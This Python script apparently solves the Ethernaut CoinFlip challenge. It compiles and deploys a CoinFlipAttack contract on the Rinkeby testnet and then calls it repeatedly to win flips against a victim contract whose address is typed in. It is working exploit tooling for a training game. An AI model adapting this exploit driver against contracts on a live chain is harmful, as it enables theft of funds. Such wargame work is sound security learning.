#!/usr/bin/env python3
#
# 
#
import json
import os
import time

import solcx
from web3 import Web3
from web3.middleware import geth_poa_middleware

solcx.install_solc('0.6.0')

# Alternatively, use compile_standard which requires the
# Solidity-defined compiler JSON input/output specification.
compiled = solcx.compile_files(
        source_files=['SafeMath.sol', 'CoinFlip.sol', 'CoinFlipAttack.sol'],
        solc_version='0.6.0')

PLAYER_ADDR = os.environ['PLAYER_ADDR']
INFURA_ID = os.environ['INFURA_ID']
PRIV_KEY = os.environ['PRIV_KEY']

CHAIN_ID = 4

w3 = Web3(Web3.HTTPProvider(f'https://rinkeby.infura.io/v3/{INFURA_ID}'))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

VICTIM_ADDR = input('Victim address:')
VICTIM = w3.eth.contract(
    address=VICTIM_ADDR,
    abi=compiled['CoinFlip.sol:CoinFlip']['abi'])

contracts = {}
for name, comp in compiled.items():
    name = name.split(':')[1]
    print(f'Deploying contract {name}')
    contract = w3.eth.contract(abi=comp['abi'], bytecode=comp['bin'])
    txn = {
        'chainId': CHAIN_ID,
        'from': PLAYER_ADDR,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDR)}
    if name == 'CoinFlipAttack':
        txn = contract.constructor(VICTIM_ADDR).buildTransaction(txn)
    else:
        txn = contract.constructor().buildTransaction(txn)
    txn = w3.eth.account.sign_transaction(txn, private_key=PRIV_KEY)
    txn = w3.eth.send_raw_transaction(txn.rawTransaction)
    address = w3.eth.wait_for_transaction_receipt(txn).contractAddress
    contracts[name] = w3.eth.contract(address=address, abi=comp['abi'])
    # TODO: Verify the contract on Etherscan.

for i in range(10):
    print(f'Flip #{i}')
    txn = {
        'chainId': CHAIN_ID,
        'from': PLAYER_ADDR,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDR)}
    txn = contracts['CoinFlipAttack'].functions.flip().buildTransaction(txn)
    txn = w3.eth.account.sign_transaction(txn, private_key=PRIV_KEY)
    txn = w3.eth.send_raw_transaction(txn.rawTransaction)
    w3.eth.wait_for_transaction_receipt(txn)
    # The following sleep is required because the CoinFlip contract
    # checks that a new block was mined for every query, otherwise
    # it will revert (for DoS protection). This is a bit stupid, an
    # explicit check would have been better.
    time.sleep(40)
    print(f'Wins: {VICTIM.functions.consecutiveWins().call()}')
